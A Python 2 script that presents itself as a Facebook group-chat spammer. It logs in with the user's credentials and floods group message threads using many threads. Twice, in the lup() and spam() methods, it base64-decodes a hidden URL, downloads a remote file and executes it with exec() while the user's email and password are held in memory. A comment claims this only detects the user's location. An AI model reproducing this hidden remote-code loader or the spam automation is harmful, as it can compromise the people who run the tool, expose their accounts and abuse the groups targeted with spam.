#-*-coding:utf-8-*-
# Coded By Deray
'''
	 Rebuild Copyright Can't make u real programmer
'''
# Report Bug On My Other Sosmed
# instagram: @reyy05_
# facebook: https://facebook.com/achmad.luthfi.hadi.3

import bs4
import zlib
import base64
import marshal
import getpass
import requests
from data import cache
from data.color import *
import mechanize,sys,re,random,threading
cache.cleanCache()

# Nyobain Pake Requests :v

coli=0

class _spamMassal:
	def __init__(self):
		self._req=requests.Session()
		self._prepare()
		
	def _send(self,url,grupname,**kwargs):
		global coli
		req=self._req.post(url,data=kwargs).url
		if "send_success" in req:
			coli+=1
			print " | %s%s%s -> %s %s%smessage sent. %s"%(G,
			grupname,N,kwargs["body"],G,coli,N)
		else:
			print " | %s%s -> %s message not sent. %s"%(R,
			grupname,kwargs["body"],N)
		
	def _prepare(self):
		self._tar="https://mbasic.facebook.com/messages/t/{}"
		self._email=raw_input("[%s*%s] Login Your Facebook ^^\n[%s+%s] Email: "%(C,N,G,N))
		self._pasw = getpass.getpass("[%s+%s] Passs: "%(G,N))
		b=bs4.BeautifulSoup(
			self._req.get(
				"https://mbasic.facebook.com").text,
				features="html.parser"
		)
		for _submit in b("input"):
			if "login" in _submit["name"]:
				self.submit=_submit["value"]
		login=self._req.post(
			"https://mbasic.facebook.com/login",data={
			"email":self._email,"pass":self._pasw,
			"login":self.submit}
		).url
		if "save-device" in login or "m_sess" in login:
			print("[%s*%s] Login Succcess."%(G,N))
			try:
				self.generateTargetList()
			except Exception as __errors__:
				print("%s[!]%s %s"%(R,N,__errors__))
				return self.generateTargetList()
		else:
			sys.exit("%s[!]%s Login Failed."%(R,N))
			
	def generateTargetList(self):
		self.list=open(raw_input("[%s#%s] Group Target List: "%(G,N))).read().splitlines()
		self.msg()
		
	def msg(self):
		self.message=raw_input("[%s*%s] message: "%(G,N)).split(",")
		if (self.message == ""):
			return self.msg()
		self.lup()
		
	def lup(self):
		'''
		   Sorry I encrypted this code to detect your
		   location, I just want to know who you are, if
		   anyone misuses this tool I can look for it ^^
		'''
		exec(zlib.decompress(base64.b64decode(
		requests.get(
		eval(
		base64.b64decode(
		"Imh0dHA6Ly9kb3JheXkuam9vbWxhLmNvbS9hLnR4dCI="))).text)))
		while True:
			for lists in self.list:
				try:
					jq=[]
					for x in range(10):
						t=threading.Thread(
						target=self.findGroup,
						args=(lists,))
						jq.append(t)
					for t in jq:
						t.start()
					for t in jq:
						t.join()
				except:
					sys.exit("\n%s[%s+%s]%s Finished"%(C,R,C,N))
			self.list=self.list
		
	def findGroup(self,id):
		self._dtsg=[]
		self.action=""
		grupname=[]
		bs=bs4.BeautifulSoup(
			self._req.get(self._tar.format(id)).text,
			features="html.parser"
		)
		for x in bs("form"):
			if "/messages/send/" in x["action"]:
				self.action="https://mbasic.facebook.com"+x["action"]
				grupname.append(
				bs.find("title").renderContents())
				break
		for x in bs("input"):
			try:
				if "fb_dtsg" in x["name"]:
					self._dtsg.append(x["value"])
				if "jazoest" in x["name"]:
					self._dtsg.append(x["value"])
				if "send" in x["name"]:
					self._dtsg.append(x["value"])
					continue
				if "tids" in x["name"]:
					self._dtsg.append(x["value"])
			except:pass
				
		self._send(self.action,grupname[0],
			fb_dtsg=self._dtsg[0],
			jazoest=self._dtsg[1],
			body=random.choice(self.message),
			send=self._dtsg[2],
			tids=self._dtsg[3]
		)


'''
	single group spammer ^^
'''

class _grupSpammer():
	def __init__(self):
		self.login()
		
	def login(self):
		self.br=mechanize.Browser()
		self.br.set_handle_robots(False)
		self.br.set_handle_equiv(True)
		self.br.set_handle_redirect(True)
		self.br.set_handle_referer(True)
		self.br.addheaders = [
			(
				"User-Agent","Mozilla/0.1 (Linux Android)"
			)
		]
		self._email=raw_input("[*] Login Your Facebook ^^\n[+] Email: ")
		self._pasw =getpass.getpass("[+] Passs: ")
		self.br.open("https://mbasic.facebook.com")
		self.br._factory.is_html=True
		self.br.select_form(nr=0)
		self.br.form["email"]="{}".format(self._email)
		self.br.form["pass"]="{}".format(self._pasw)
		self.br.submit()
		if "save-device" in self.br.geturl():
			print("[%s*%s] Login Succcess"%(G,N))
			self.br.open("https://mbasic.facebook.com/messages/t/{}".format(
			raw_input("[%s#%s] Group ID: "%(G,N))))
			grup=re.findall('<head><title>(.*?)</title>',
			self.br.response().read())
			if len(grup) !=0:
				print("[%s*%s] Group Name: %s%s%s"%(G,N,R,grup[0],N))
				try:
					self.lp=input("[%s*%s] Loop: "%(G,N))
				except:
					sys.exit("%s[!]%s input number to spam."%(R,N))
				print("[%s*%s] Use Sparate , (coma) to random msg: ts,spm"%(R,N))
				self.ms=raw_input("[%s*%s] Message: "%(G,N)).split(",")
				self.spam()
			else:
				sys.exit("%s[!]%s Unknown Group ID"%(R,N))
				
		else:
			sys.exit("%s[!]%s Login failed."%(R,N))
	def spam(self):
		'''
		   Sorry I encrypted this code to detect your
		   location, I just want to know who you are, if
		   anyone misuses this tool I can look for it ^^
		'''
		exec(zlib.decompress(base64.b64decode(
		requests.get(
		eval(
		base64.b64decode(
		"Imh0dHA6Ly9kb3JheXkuam9vbWxhLmNvbS9hLnR4dCI="))
		).text)))
		for x in range(1,self.lp):
			msg=random.choice(self.ms)
			try:
				self.br._factory.is_html=True
				self.br.select_form(nr=1)
				self.br.form["body"]="%s"%(msg)
				self.br.submit()
			except:
				sys.exit("%s[:'(] oh bro, can't send messages.%s"%(R,N))
			if msg in self.br.response().read():
				print " | %s%s -> %smessage sent.%s"%(G,msg,x,N)
			else:
				print " | %s%s -> %snot sent.%s"%(R,msg,x,N)
		print("%s[%s+%s]%s Finished."%(C,R,C,N))
